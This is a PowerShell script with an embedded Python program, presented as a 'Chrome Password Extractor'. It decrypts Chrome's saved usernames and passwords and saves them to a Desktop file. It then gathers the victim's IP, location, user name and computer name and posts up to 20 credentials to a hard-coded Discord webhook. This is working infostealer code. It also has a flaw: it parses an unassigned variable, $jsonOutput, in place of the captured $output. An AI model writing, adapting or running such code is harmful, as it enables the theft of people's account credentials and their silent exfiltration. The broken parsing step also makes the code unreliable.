# Chrome Password Extractor - Using Python for Decryption

Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
Write-Host ""

# Create Python decryption script
$pythonScript = @'
import sys
import json
import base64
import sqlite3
import shutil
import os

try:
    from Crypto.Cipher import AES
    import win32crypt
except ImportError as e:
    print(json.dumps({"error": f"Missing module: {e}"}))
    sys.exit(1)

try:
    # Get key
    local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state, "r", encoding="utf-8") as f:
        state = json.loads(f.read())

    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    # Copy database
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_db = os.path.join(os.environ["TEMP"], "chrome_temp_{}.db".format(os.getpid()))
    shutil.copyfile(db_path, temp_db)

    # Query
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    all_rows = cursor.fetchall()
    sys.stderr.write(f"DEBUG: Found {len(all_rows)} total rows\n")

    results = []
    decryption_attempts = 0
    decryption_failures = 0
    
    for row in all_rows:
        url, username, enc_pass = row
        
        if not enc_pass:
            sys.stderr.write(f"DEBUG: Skipping {url} - no encrypted password\n")
            continue
        
        decryption_attempts += 1
        sys.stderr.write(f"DEBUG: Attempting to decrypt {url}\n")
        sys.stderr.write(f"DEBUG: Encrypted data length: {len(enc_pass)}\n")
        sys.stderr.write(f"DEBUG: First 3 bytes: {enc_pass[:3]}\n")
        
        # Decrypt
        try:
            # Check version prefix
            if enc_pass[:3] == b'v10':
                # v10 format
                nonce = enc_pass[3:15]
                ciphertext = enc_pass[15:-16]
                tag = enc_pass[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
                
                sys.stderr.write(f"DEBUG: Successfully decrypted (v10)\n")
            elif enc_pass[:3] == b'v11' or enc_pass[:3] == b'v20':
                # v11/v20 format - different structure
                # v20: version(3) + nonce(12) + ciphertext + tag(16)
                nonce = enc_pass[3:15]
                # For v20, the tag is integrated differently
                ciphertext_with_tag = enc_pass[15:]
                
                # Split ciphertext and tag
                ciphertext = ciphertext_with_tag[:-16]
                tag = ciphertext_with_tag[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                
                # For v20, try without AAD first
                try:
                    password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
                except:
                    # Try with empty AAD
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    password = cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
                
                sys.stderr.write(f"DEBUG: Successfully decrypted (v20)\n")
            else:
                # Old DPAPI
                password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                sys.stderr.write(f"DEBUG: Successfully decrypted (DPAPI)\n")
            
            results.append({
                "url": url,
                "username": username,
                "password": password
            })
        except Exception as e:
            decryption_failures += 1
            sys.stderr.write(f"DEBUG: Decryption failed: {str(e)}\n")

    sys.stderr.write(f"DEBUG: Total attempts: {decryption_attempts}, Failures: {decryption_failures}, Success: {len(results)}\n")

    cursor.close()
    conn.close()
    
    try:
        os.remove(temp_db)
    except:
        pass

    # Output ONLY JSON to stdout (not stderr)
    print(json.dumps(results))
    
except Exception as e:
    # Errors go to stderr
    sys.stderr.write(f"FATAL ERROR: {str(e)}\n")
    print(json.dumps({"error": str(e)}))
    sys.exit(1)
'@

$scriptPath = "$env:TEMP\decrypt_chrome.py"
$pythonScript | Out-File $scriptPath -Encoding UTF8

Write-Host "Installing Python dependencies..." -ForegroundColor Yellow
python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null

Write-Host "Running Python decryptor..." -ForegroundColor Yellow
Write-Host ""

# Run and capture ALL output
$output = python $scriptPath 2>&1 | Out-String

Write-Host "=== RAW PYTHON OUTPUT ===" -ForegroundColor Cyan
Write-Host $output
Write-Host "=== END OUTPUT ===" -ForegroundColor Cyan
Write-Host ""

# Parse results
try {
    # Check if output contains error
    if ($jsonOutput -match '"error"') {
        Write-Host "Python script returned an error!" -ForegroundColor Red
        $errorObj = $jsonOutput | ConvertFrom-Json
        Write-Host "Error: $($errorObj.error)" -ForegroundColor Red
        Remove-Item $scriptPath
        Read-Host "Press Enter to exit"
        exit
    }
    
    # Try to parse JSON
    $passwords = $jsonOutput | ConvertFrom-Json
    
    if (-not $passwords -or $passwords.Count -eq 0) {
        Write-Host "No passwords found in output!" -ForegroundColor Yellow
        Write-Host "This could mean:" -ForegroundColor Yellow
        Write-Host "  - Chrome has no saved passwords" -ForegroundColor Yellow
        Write-Host "  - Python script failed silently" -ForegroundColor Yellow
        Write-Host "  - Chrome is running (close it!)" -ForegroundColor Yellow
        Remove-Item $scriptPath
        Read-Host "Press Enter to exit"
        exit
    }
    
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "Successfully extracted $($passwords.Count) passwords!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    
    foreach ($p in $passwords) {
        Write-Host "URL: $($p.url)" -ForegroundColor Cyan
        Write-Host "  Username: $($p.username)" -ForegroundColor White
        Write-Host "  Password: $($p.password)" -ForegroundColor Green
        Write-Host ""
    }
    
    # Save to file
    $outFile = "$env:USERPROFILE\Desktop\chrome_passwords.txt"
    $passwords | ConvertTo-Json | Out-File $outFile
    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
    
    # Send to Discord
    Write-Host ""
    Write-Host "Sending to Discord..." -ForegroundColor Yellow
    
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:globe_with_meridians: $ip - $city, $country

**🔐 Chrome Passwords ($($passwords.Count)):**$passText
"@
    
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
    Write-Host "Sent to Discord!" -ForegroundColor Green
    
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Item $scriptPath
Write-Host ""
Read-Host "Press Enter to exit"
